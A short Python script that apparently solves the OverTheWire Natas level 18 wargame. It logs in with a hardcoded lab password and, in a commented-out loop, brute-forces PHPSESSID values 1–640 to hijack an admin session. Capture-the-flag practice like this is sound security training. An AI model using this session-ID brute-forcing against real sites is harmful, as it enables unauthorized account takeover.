#!/usr/bin/env python3
from http import cookies
import requests 
url = 'http://natas18.natas.labs.overthewire.org'
s = requests.Session()
s.auth = ('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
data = {'username':'admin',  'password':'fjla'}
req = s.post(url, data = data, cookies = {'PHPSESSID':'119'})
print(req.text)
'''
for i in range(1, 641):
    print(f'Find position {i}')
    req = s.post(url, data = data, cookies = {'PHPSESSID':str(i)})
    if 'You are an admin' in req.text:
        print(f'valid id:{i}')
        break
'''
